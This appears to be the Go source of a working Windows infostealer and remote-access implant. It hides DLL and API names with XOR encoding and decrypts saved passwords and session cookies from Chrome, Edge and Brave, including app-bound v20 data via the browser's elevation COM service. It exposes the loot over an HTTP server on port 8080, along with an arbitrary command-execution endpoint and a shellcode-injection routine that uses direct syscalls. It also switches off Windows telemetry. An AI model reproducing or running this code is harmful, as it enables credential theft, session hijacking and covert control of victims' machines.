package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	_ "modernc.org/sqlite"
)

var (
	ole32             = syscall.NewLazyDLL("ole32.dll")
	oleaut32          = syscall.NewLazyDLL("oleaut32.dll")
	pCoInitialize     = ole32.NewProc("CoInitialize")
	pCoCreateInstance = ole32.NewProc("CoCreateInstance")
	pCoUninitialize   = ole32.NewProc("CoUninitialize")
	pSysAllocString   = oleaut32.NewProc("SysAllocString")
	pSysFreeString    = oleaut32.NewProc("SysFreeString")

	CLSID_Elevator = windows.GUID{Data1: 0x70886030, Data2: 0xAD97, Data3: 0x4F55, Data4: [8]byte{0xBC, 0xEE, 0x09, 0x75, 0xAB, 0xC7, 0x49, 0x0E}}
	IID_IElevator  = windows.GUID{Data1: 0xA9E69610, Data2: 0xB80D, Data3: 0x470F, Data4: [8]byte{0x99, 0x43, 0xA3, 0x9E, 0x21, 0xEE, 0x3D, 0x04}}
)

type DATA_BLOB struct { cbData uint32; pbData *byte }
type Entry struct { B string `json:"b"`; U string `json:"u"`; S string `json:"s"`; P string `json:"p"` }
type Cookie struct { B string `json:"b"`; H string `json:"h"`; N string `json:"n"`; V string `json:"v"` }
type Node struct { U string `json:"u"`; P string `json:"p"`; C string `json:"c"` }

func d(b []byte) string {
	for i := range b { b[i] ^= 0x3F }
	return string(b)
}

func forceCopy(src, dst string) error {
	s, err := os.Open(src); if err != nil { return err }; defer s.Close()
	d, err := os.Create(dst); if err != nil { return err }; defer d.Close()
	_, err = io.Copy(d, s); return err
}

func isAdmin() bool {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil { return false }
	defer token.Close()
	return token.IsElevated()
}

func decryptV20(data []byte) string {
	pCoInitialize.Call(0)
	defer pCoUninitialize.Call()
	var elevator uintptr
	hr, _, _ := pCoCreateInstance.Call(uintptr(unsafe.Pointer(&CLSID_Elevator)), 0, uintptr(windows.CLSCTX_LOCAL_SERVER), uintptr(unsafe.Pointer(&IID_IElevator)), uintptr(unsafe.Pointer(&elevator)))
	if hr != 0 { return "[V20_PROTECTED]" }
	defer func() {
		vtable := *(*uintptr)(unsafe.Pointer(elevator))
		releaseMethod := *(*uintptr)(unsafe.Pointer(vtable + 2*unsafe.Sizeof(uintptr(0))))
		syscall.Syscall(releaseMethod, 1, elevator, 0, 0)
	}()
	b64In := base64.StdEncoding.EncodeToString(data)
	ptr, _, _ := pSysAllocString.Call(uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(b64In))))
	if ptr == 0 { return "[V20_MEM_ERR]" }
	defer pSysFreeString.Call(ptr)
	var outBSTR *uint16; var lastErr uint32
	vtable := *(*uintptr)(unsafe.Pointer(elevator))
	decryptMethod := *(*uintptr)(unsafe.Pointer(vtable + 4*unsafe.Sizeof(uintptr(0))))
	hr, _, _ = syscall.Syscall6(decryptMethod, 4, elevator, ptr, uintptr(unsafe.Pointer(&outBSTR)), uintptr(unsafe.Pointer(&lastErr)), 0, 0)
	if hr == 0 && outBSTR != nil {
		res := windows.UTF16PtrToString(outBSTR)
		if dec, err := base64.StdEncoding.DecodeString(res); err == nil { return string(dec) }
		return res
	}
	return "[V20_LOCKED]"
}

func decryptData(data []byte, key []byte) string {
	if len(data) < 3 { return "" }
	prefix := string(data[:3])
	if prefix == "v10" || prefix == "v11" {
		if len(data) < 15 { return "" }
		iv := data[3:15]; payload := data[15:]
		block, err := aes.NewCipher(key); if err != nil { return "" }
		gcm, err := cipher.NewGCM(block); if err != nil { return "" }
		res, err := gcm.Open(nil, iv, payload, nil); if err == nil { return string(res) }
	}
	if prefix == "v20" { return decryptV20(data) }
	var out DATA_BLOB; in := DATA_BLOB{cbData: uint32(len(data)), pbData: &data[0]}
	if err := CryptUnprotectData(&out, nil, nil, nil, nil, 0, &in); err == nil {
		res := make([]byte, out.cbData); copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
		windows.LocalFree(windows.Handle(unsafe.Pointer(out.pbData))); return string(res)
	}
	return ""
}

func CryptUnprotectData(dataOut *DATA_BLOB, desc **uint16, ent *DATA_BLOB, res unsafe.Pointer, prompt unsafe.Pointer, flags uint32, dataIn *DATA_BLOB) error {
	c32, err := syscall.LoadDLL(d([]byte{0x5C, 0x4D, 0x46, 0x4F, 0x4B, 0x0C, 0x0D, 0x11, 0x5B, 0x53, 0x53})); if err != nil { return err }
	p, err := c32.FindProc(d([]byte{0x7C, 0x4D, 0x46, 0x4F, 0x4B, 0x6A, 0x51, 0x4F, 0x4D, 0x50, 0x4B, 0x5A, 0x5C, 0x4B, 0x7B, 0x5E, 0x4B, 0x5E})); if err != nil { return err }
	r, _, _ := p.Call(uintptr(unsafe.Pointer(dataIn)), uintptr(unsafe.Pointer(desc)), uintptr(unsafe.Pointer(ent)), uintptr(res), uintptr(prompt), uintptr(flags), uintptr(unsafe.Pointer(dataOut)))
	if r == 0 { return fmt.Errorf("fail") }
	return nil
}

func getMasterKey(browser string) ([]byte, error) {
	la := os.Getenv("LOCALAPPDATA")
	var lsPath string
	switch browser {
	case "Brave": lsPath = filepath.Join(la, d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x6C, 0x50, 0x59, 0x4B, 0x48, 0x5E, 0x4D, 0x5A}), d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x12, 0x7D, 0x4D, 0x50, 0x48, 0x4C, 0x5A, 0x4D}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}), d([]byte{0x73, 0x50, 0x5C, 0x5E, 0x53, 0x1F, 0x6C, 0x4B, 0x5E, 0x4B, 0x5A}))
	case "Edge": lsPath = filepath.Join(la, d([]byte{0x72, 0x56, 0x5C, 0x4D, 0x50, 0x4C, 0x50, 0x59, 0x4B}), d([]byte{0x7A, 0x5B, 0x58, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}), d([]byte{0x73, 0x50, 0x5C, 0x5E, 0x53, 0x1F, 0x6C, 0x4B, 0x5E, 0x4B, 0x5A}))
	default: lsPath = filepath.Join(la, d([]byte{0x78, 0x50, 0x50, 0x58, 0x53, 0x5A}), d([]byte{0x7C, 0x57, 0x4D, 0x50, 0x52, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}), d([]byte{0x73, 0x50, 0x5C, 0x5E, 0x53, 0x1F, 0x6C, 0x4B, 0x5E, 0x4B, 0x5A}))
	}
	if _, err := os.Stat(lsPath); err != nil { return nil, err }
	tmp := filepath.Join(os.TempDir(), "ls_tmp"); if err := forceCopy(lsPath, tmp); err != nil { return nil, err }; defer os.Remove(tmp)
	b, err := os.ReadFile(tmp); if err != nil { return nil, err }; var j map[string]interface{}; if err := json.Unmarshal(b, &j); err != nil { return nil, err }
	osCr, ok := j["os_crypt"].(map[string]interface{}); if !ok { return nil, fmt.Errorf("fail os_crypt") }
	ek, ok := osCr["encrypted_key"].(string); if !ok { return nil, fmt.Errorf("fail ek") }
	db, err := base64.StdEncoding.DecodeString(ek); if err != nil { return nil, err }; db = db[5:]
	var out DATA_BLOB; in := DATA_BLOB{cbData: uint32(len(db)), pbData: &db[0]}
	if err := CryptUnprotectData(&out, nil, nil, nil, nil, 0, &in); err != nil { return nil, err }
	res := make([]byte, out.cbData); copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	windows.LocalFree(windows.Handle(unsafe.Pointer(out.pbData))); return res, nil
}

func getProcessListDetailed() []map[string]string {
	cmd := exec.Command("tasklist", "/V", "/FO", "CSV", "/NH")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	o, err := cmd.Output(); if err != nil { return nil }
	rd := csv.NewReader(strings.NewReader(string(o))); rs, _ := rd.ReadAll()
	var ps []map[string]string
	for _, r := range rs { if len(r) >= 7 { ps = append(ps, map[string]string{"pid": r[1], "name": r[0], "user": r[6], "mem": r[4]}) } }
	return ps
}

func ApplyTweaks() []string {
	var r []string
	ts := []struct { p, v string; d uint32 }{
		{"SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection", "AllowTelemetry", 0},
		{"SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Error Reporting", "Disabled", 1},
		{"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Start_TrackProgs", 0},
	}
	for _, t := range ts {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, t.p, registry.SET_VALUE|registry.QUERY_VALUE)
		if err == nil { err = k.SetDWordValue(t.v, t.d); k.Close() }
		if err != nil { r = append(r, "FAIL: "+t.v+" (Access Denied)") } else { r = append(r, "SUCCESS: "+t.v) }
	}
	_ = exec.Command("sc", "stop", "DiagTrack").Run()
	_ = exec.Command("sc", "config", "DiagTrack", "start=disabled").Run()
	r = append(r, "SUCCESS: DiagTrack_OFF")
	return r
}

func captureSnapshot(src, dst string) { exts := []string{"", "-wal", "-shm", "-journal"}; for _, e := range exts { _ = forceCopy(src+e, dst+e) } }

var (
	kL  = syscall.MustLoadDLL(d([]byte{0x54, 0x5A, 0x4D, 0x51, 0x5A, 0x53, 0x0C, 0x0D, 0x11, 0x5B, 0x53, 0x53}))
	pOp = kL.MustFindProc(d([]byte{0x70, 0x4F, 0x5A, 0x51, 0x6F, 0x4D, 0x50, 0x5C, 0x5A, 0x4C, 0x4C}))
	pCl = kL.MustFindProc(d([]byte{0x7C, 0x53, 0x50, 0x4C, 0x5A, 0x77, 0x5E, 0x51, 0x5B, 0x53, 0x5A}))
	cCn net.Conn
	u   = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	clients = make(map[*websocket.Conn]bool)
	mut sync.Mutex; apiToken string
)

func init() { apiToken = "SIGNAL_" + strconv.FormatInt(int64(os.Getpid()), 16) }

func auth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer func() { if r := recover(); r != nil { http.Error(w, "Error", 500) } }()
		if r.URL.Path != "/" && r.URL.Path != "/ws" && r.Header.Get("X-Signal-Token") != apiToken { http.Error(w, "Denied", 403); return }
		next(w, r)
	}
}

func logS(s, l string) { msg := map[string]string{"m": s, "l": l}; mut.Lock(); defer mut.Unlock(); for c := range clients { c.WriteJSON(msg) } }

func EnergyFlow(a1 uintptr, id uint32, ep uintptr, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uint32
type SPr struct { ID uint32; AD uintptr }
func res(n string) SPr {
	nt := syscall.MustLoadDLL(d([]byte{0x51, 0x4B, 0x5B, 0x53, 0x53, 0x11, 0x5B, 0x53, 0x53}))
	p, err := nt.FindProc(n); if err != nil { return SPr{0, 0} }
	a := p.Addr()
	if id, ad := sc(a); ad != 0 { return SPr{id, ad} }
	for i := 1; i < 32; i++ {
		if id, ad := sc(a - uintptr(i*32)); ad != 0 { return SPr{id + uint32(i), ad} }
		if id, ad := sc(a + uintptr(i*32)); ad != 0 { return SPr{id - uint32(i), ad} }
	}
	return SPr{0, 0}
}
func sc(a uintptr) (uint32, uintptr) {
	b := *(*[32]byte)(unsafe.Pointer(a))
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		id := *(*uint32)(unsafe.Pointer(a + 4))
		for i := 0; i < 32; i++ { if b[i] == 0x0F && b[i+1] == 0x05 { return id, a + uintptr(i) } }
	}
	return 0, 0
}

func main() {
	go func() {
		l, _ := net.Listen("tcp", "127.0.0.1:0")
		for {
			c, err := l.Accept(); if err != nil { continue }; cCn = c
			go func() {
				b := make([]byte, 4096)
				for { n, err := c.Read(b); if err != nil { break }; msg := map[string]string{"a": "b", "o": string(b[:n])}; mut.Lock(); for cl := range clients { cl.WriteJSON(msg) }; mut.Unlock() }
			}()
		}
	}()
	http.HandleFunc("/v1/sys/st", auth(func(w http.ResponseWriter, r *http.Request) { status := "USER"; if isAdmin() { status = "ADMIN" }; w.Write([]byte(status)) }))
	http.HandleFunc("/v1/sys/hex", auth(func(w http.ResponseWriter, r *http.Request) { b, _ := os.ReadFile("payloads/research_signal.bin"); if len(b) > 256 { b = b[:256] }; w.Write([]byte(fmt.Sprintf("%02x", b))) }))
	http.HandleFunc("/v1/sys/cmd", auth(func(w http.ResponseWriter, r *http.Request) {
		var data map[string]string; json.NewDecoder(r.Body).Decode(&data); logS("RUN: "+data["c"], "INFO")
		cmd := exec.Command("cmd", "/c", "chcp 65001 > nul && "+data["c"]); cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput(); w.Write(out)
	}))
	
	http.HandleFunc("/v1/sys/nexus", auth(func(w http.ResponseWriter, r *http.Request) {
		la := os.Getenv("LOCALAPPDATA"); browsers := []string{"Chrome", "Edge", "Brave"}
		nexus := make(map[string]map[string]string)
		for _, name := range browsers {
			var base string
			switch name {
			case "Brave": base = filepath.Join(la, d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x6C, 0x50, 0x59, 0x4B, 0x48, 0x5E, 0x4D, 0x5A}), d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x12, 0x7D, 0x4D, 0x50, 0x48, 0x4C, 0x5A, 0x4D}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			case "Edge": base = filepath.Join(la, d([]byte{0x72, 0x56, 0x5C, 0x4D, 0x50, 0x4C, 0x50, 0x59, 0x4B}), d([]byte{0x7A, 0x5B, 0x58, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			default: base = filepath.Join(la, d([]byte{0x78, 0x50, 0x50, 0x58, 0x53, 0x5A}), d([]byte{0x7C, 0x57, 0x4D, 0x50, 0x52, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			}
			filepath.Walk(base, func(p string, info os.FileInfo, err error) error {
				if err == nil {
					if strings.Contains(info.Name(), "Login Data") && !strings.Contains(p, "journal") {
						tmp := filepath.Join(os.TempDir(), "i_nexus"); captureSnapshot(p, tmp); defer os.Remove(tmp)
						db, _ := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(tmp)))
						if db != nil {
							rows, _ := db.Query("SELECT origin_url, username_value FROM logins")
							if rows == nil { rows, _ = db.Query("SELECT action_url, username_value FROM logins") }
							if rows != nil {
								for rows.Next() {
									var u, us string; rows.Scan(&u, &us)
									if _, ok := nexus[u]; !ok { nexus[u] = make(map[string]string) }
									nexus[u]["u"] = us; nexus[u]["p"] = "DETECTED"
								}
								rows.Close()
							}
							db.Close()
						}
					}
					if strings.Contains(info.Name(), "Cookies") && !strings.Contains(p, "journal") {
						tmp := filepath.Join(os.TempDir(), "c_nexus"); captureSnapshot(p, tmp); defer os.Remove(tmp)
						db, _ := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(tmp)))
						if db != nil {
							rows, _ := db.Query("SELECT host_key FROM cookies")
							if rows != nil {
								for rows.Next() {
									var h string; rows.Scan(&h); host := strings.TrimPrefix(h, ".")
									for site := range nexus { if strings.Contains(site, host) { nexus[site]["c"] = "ACTIVE_SESSION" } }
								}
								rows.Close()
							}
							db.Close()
						}
					}
				}
				return nil
			})
		}
		json.NewEncoder(w).Encode(nexus)
	}))

	http.HandleFunc("/v1/sys/a7", auth(func(w http.ResponseWriter, r *http.Request) {
		la := os.Getenv("LOCALAPPDATA"); browsers := []string{"Chrome", "Edge", "Brave"}
		var resEntries []Entry = []Entry{}
		for _, name := range browsers {
			mk, err := getMasterKey(name); if err != nil { logS("MK_FAIL: "+name, "ERROR"); continue }
			logS("MK_HIT: "+name, "SUCCESS")
			var base string
			switch name {
			case "Brave": base = filepath.Join(la, d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x6C, 0x50, 0x59, 0x4B, 0x48, 0x5E, 0x4D, 0x5A}), d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x12, 0x7D, 0x4D, 0x50, 0x48, 0x4C, 0x5A, 0x4D}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			case "Edge": base = filepath.Join(la, d([]byte{0x72, 0x56, 0x5C, 0x4D, 0x50, 0x4C, 0x50, 0x59, 0x4B}), d([]byte{0x7A, 0x5B, 0x58, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			default: base = filepath.Join(la, d([]byte{0x78, 0x50, 0x50, 0x58, 0x53, 0x5A}), d([]byte{0x7C, 0x57, 0x4D, 0x50, 0x52, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			}
			filepath.Walk(base, func(p string, info os.FileInfo, err error) error {
				if err == nil && (strings.Contains(info.Name(), "Login Data") && !strings.Contains(p, "journal")) {
					logS("FOUND_INTEL: "+p, "INFO")
					tmp := filepath.Join(os.TempDir(), "i_db"); captureSnapshot(p, tmp); defer os.Remove(tmp)
					db, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(tmp)))
					if err == nil {
						query := "SELECT origin_url, username_value, password_value FROM logins"
						rows, err := db.Query(query)
						if err != nil { query = "SELECT action_url, username_value, password_value FROM logins"; rows, err = db.Query(query) }
						if err == nil && rows != nil {
							count := 0
							for rows.Next() {
								var u, us string; var pData []byte; rows.Scan(&u, &us, &pData); dec := decryptData(pData, mk)
								if dec != "" { resEntries = append(resEntries, Entry{name, u, us, dec}); count++ }
							}
							rows.Close(); if count > 0 { logS(fmt.Sprintf("INTEL: %d in %s", count, p), "SUCCESS") }
						}
						db.Close()
					}
				}
				return nil
			})
		}
		json.NewEncoder(w).Encode(resEntries)
	}))
	http.HandleFunc("/v1/sys/cookies", auth(func(w http.ResponseWriter, r *http.Request) {
		la := os.Getenv("LOCALAPPDATA"); browsers := []string{"Chrome", "Edge", "Brave"}
		var resCookies []Cookie = []Cookie{}
		for _, name := range browsers {
			mk, err := getMasterKey(name); if err != nil { logS("MK_FAIL: "+name, "ERROR"); continue }
			logS("MK_HIT: "+name, "SUCCESS")
			var base string
			switch name {
			case "Brave": base = filepath.Join(la, d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x6C, 0x50, 0x59, 0x4B, 0x48, 0x5E, 0x4D, 0x5A}), d([]byte{0x7D, 0x4D, 0x5E, 0x49, 0x5A, 0x12, 0x7D, 0x4D, 0x50, 0x48, 0x4C, 0x5A, 0x4D}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			case "Edge": base = filepath.Join(la, d([]byte{0x72, 0x56, 0x5C, 0x4D, 0x50, 0x4C, 0x50, 0x59, 0x4B}), d([]byte{0x7A, 0x5B, 0x58, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			default: base = filepath.Join(la, d([]byte{0x78, 0x50, 0x50, 0x58, 0x53, 0x5A}), d([]byte{0x7C, 0x57, 0x4D, 0x50, 0x52, 0x5A}), d([]byte{0x6A, 0x4C, 0x5A, 0x4D, 0x1F, 0x7B, 0x5E, 0x4B, 0x5E}))
			}
			filepath.Walk(base, func(p string, info os.FileInfo, err error) error {
				if err == nil && (strings.Contains(info.Name(), "Cookies") && !strings.Contains(p, "journal")) {
					logS("FOUND_COOKIE: "+p, "INFO")
					tmp := filepath.Join(os.TempDir(), "c_db"); captureSnapshot(p, tmp); defer os.Remove(tmp)
					db, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&nolock=1&immutable=1", filepath.ToSlash(tmp)))
					if err == nil {
						rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
						if err == nil && rows != nil {
							for rows.Next() {
								var h, n string; var v []byte; rows.Scan(&h, &n, &v); dec := decryptData(v, mk)
								if dec != "" { resCookies = append(resCookies, Cookie{name, h, n, dec}) }
							}
							rows.Close()
						}
						db.Close()
					}
				}
				return nil
			})
		}
		json.NewEncoder(w).Encode(resCookies)
	}))
	http.HandleFunc("/v1/sys/opt", auth(func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(ApplyTweaks()) }))
	http.HandleFunc("/v1/sys/b2", auth(func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(getProcessListDetailed()) }))
	http.HandleFunc("/v1/op/d4", auth(func(w http.ResponseWriter, r *http.Request) {
		var data map[string]string; json.NewDecoder(r.Body).Decode(&data); p, _ := strconv.Atoi(data["pid"]); s, _ := os.ReadFile("payloads/research_signal.bin")
		h, _, _ := pOp.Call(0x1F0FFF, 0, uintptr(p)); aH := res(d([]byte{0x71, 0x4B, 0x7E, 0x53, 0x53, 0x50, 0x5C, 0x5E, 0x4B, 0x5A, 0x69, 0x56, 0x4D, 0x4B, 0x4A, 0x5E, 0x53, 0x72, 0x5A, 0x52, 0x50, 0x4D, 0x46}))
		wH := res(d([]byte{0x71, 0x4B, 0x68, 0x4D, 0x56, 0x4B, 0x5A, 0x69, 0x56, 0x4D, 0x4B, 0x4A, 0x5E, 0x53, 0x72, 0x5A, 0x52, 0x50, 0x4D, 0x46}))
		pH := res(d([]byte{0x71, 0x4B, 0x6F, 0x4D, 0x50, 0x4B, 0x5A, 0x5C, 0x4B, 0x69, 0x56, 0x4D, 0x4B, 0x4A, 0x5E, 0x53, 0x72, 0x5A, 0x52, 0x50, 0x4D, 0x46}))
		eH := res(d([]byte{0x71, 0x4B, 0x7C, 0x4D, 0x5A, 0x5E, 0x4B, 0x5A, 0x6B, 0x57, 0x4D, 0x5A, 0x5E, 0x5B, 0x7A, 0x47}))
		cH := res(d([]byte{0x71, 0x4B, 0x7C, 0x53, 0x50, 0x4C, 0x5A}))
		var ba uintptr; sz := uintptr(len(s)); EnergyFlow(h, aH.ID, aH.AD, uintptr(unsafe.Pointer(&ba)), 0, uintptr(unsafe.Pointer(&sz)), 0x3000, 0x04, 0, 0, 0, 0, 0)
		EnergyFlow(h, wH.ID, wH.AD, ba, uintptr(unsafe.Pointer(&s[0])), sz, 0, 0, 0, 0, 0, 0, 0)
		var oldP uint32; EnergyFlow(h, pH.ID, pH.AD, uintptr(unsafe.Pointer(&ba)), uintptr(unsafe.Pointer(&sz)), 0x20, uintptr(unsafe.Pointer(&oldP)), 0, 0, 0, 0, 0, 0)
		var ht uintptr; EnergyFlow(uintptr(unsafe.Pointer(&ht)), eH.ID, eH.AD, 0x1FFFFF, 0, h, ba, 0, 0, 0, 0, 0, 0)
		EnergyFlow(ht, cH.ID, cH.AD, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0); EnergyFlow(h, cH.ID, cH.AD, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
		logS("PULSE_SENT", "SUCCESS"); w.Write([]byte("OK"))
	}))
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) { c, _ := u.Upgrade(w, r, nil); mut.Lock(); clients[c] = true; mut.Unlock(); for { if _, _, err := c.NextReader(); err != nil { break } } })
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		b, err := os.ReadFile("src/web/index.html"); if err != nil { http.Error(w, "Error", 404); return }
		s := strings.Replace(string(b), "window.apiToken = \"SIGNAL_\" + location.port;", fmt.Sprintf("window.apiToken = \"%s\";", apiToken), 1); w.Write([]byte(s))
	})
	log.Println("[+] 0xSTATE_OK"); http.ListenAndServe(":8080", nil)
}
